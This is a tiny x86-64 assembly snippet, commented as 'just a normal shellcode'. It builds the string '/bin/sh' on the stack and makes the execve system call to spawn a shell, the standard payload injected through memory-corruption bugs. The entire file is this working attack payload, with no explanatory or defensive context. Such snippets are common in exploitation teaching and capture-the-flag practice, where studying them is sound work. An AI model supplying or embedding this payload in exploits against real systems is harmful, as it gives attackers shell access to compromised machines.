; just a normal shellcode
mov rdi, 0x0068732f6e69622f
push rdi
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 0x3b
syscall
